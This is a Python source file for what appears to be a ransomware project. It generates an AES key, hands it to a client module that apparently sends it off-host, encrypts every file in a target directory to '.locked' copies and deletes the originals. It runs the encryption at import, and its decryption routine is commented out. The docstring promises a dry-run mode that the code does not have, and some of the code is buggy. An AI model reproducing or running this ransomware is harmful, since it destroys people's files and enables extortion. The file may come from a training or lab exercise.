import os
from Crypto.Cipher import AES
import base64
from pathlib import Path
import time
import copy
from client import start_client
from config import (
    TARGET_DIR,
    ENCRYPTED_EXTENSION

)
from utils import get_all_target_files, is_safe_to_encrypt

def generateKey():
    key = os.urandom(16)
    start_client(key)
    return key

def generateIv():
    iv = os.urandom(16)
    return iv

def encryptFile(filepath,key,iv):
    """
    Encrypt a single file and replace it with .locked version.
    Dry-run mode only prints action without modifying files.
    """
    path = Path(filepath)
    if not is_safe_to_encrypt(filepath):
        print(path)
        return
    
    encrypted_path = path.with_suffix(ENCRYPTED_EXTENSION)

    print(encrypted_path)

    try:
        with open(path, "r") as f:
            plaintxt = f.read()
            cipher = AES.new(key,AES.MODE_CBC,iv)
            padded_plaintxt = plaintxt + (16 - len(plaintxt)%16)*' ' 
            ciphertxt = cipher.encrypt(padded_plaintxt.encode())
            encodedCipher = base64.b64encode(iv+ciphertxt).decode()

        with open(encrypted_path, "w") as f:
            f.write(encodedCipher)
        path.unlink()
    except Exception as e:
        print(f"Encryption failed for {filepath}: {e}")

def decryptFIle(filepath,key):

    """
    Decrypt a single .locked file back to original name & content.
    """
    path = Path(filepath)
    if path.suffix != ENCRYPTED_EXTENSION:
        print(f"Skipping non-encrypted file: {path.name}")
        return
    original_path = copy.copy(path)
    
    print(original_path)
    try:
        with open(path, "r") as f:
            encrypted_data = f.read()

        try:
            raw_data = base64.b64decode(encrypted_data)
            iv = raw_data[:16]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_text = cipher.decrypt(raw_data[16:]).decode().strip()
        except e:
            print(f"Decryption failed (wrong key or corrupted file): {path.name}:{e}")
            return
        original_path = original_path.with_suffix("")
        #original_path = original_path.rename(str(original_path.with_suffix(""))+"_dec")
        original_path = original_path.with_suffix(".txt")
        with open(original_path, "w") as f:
            f.write(decrypted_text)
        path.unlink()  # remove encrypted version
        print(f"Decrypted: {path.name} → {original_path}")
    except Exception as e:
        print(f"Decryption failed for {filepath}: {e}")
    
def encrypt_all_files(key,iv):
    files = get_all_target_files()
    for filepath in files:
        encryptFile(filepath,key,iv)


def decrypt_all_files(key):
    # Find all .locked files
    locked_files = [str(p) for p in Path(TARGET_DIR).rglob(f"*{ENCRYPTED_EXTENSION}")]

    if not locked_files:
        print("No .locked files found to decrypt.")
        return

    print(f"Found {len(locked_files)} encrypted files to recover")

    for filepath in locked_files:
        decryptFIle(filepath, key)
    print(f"Decryption finished.")


key = generateKey()
iv = generateIv()
# encryptFile('E:\\NTI\\Ransom Project\\testfolder\\filetoenc.txt',key,iv)
# time.sleep(5)
# decryptFIle('E:\\NTI\\Ransom Project\\testfolder\\filetoenc.locked',key)


encrypt_all_files(key,iv)
time.sleep(5)
#decrypt_all_files(key)
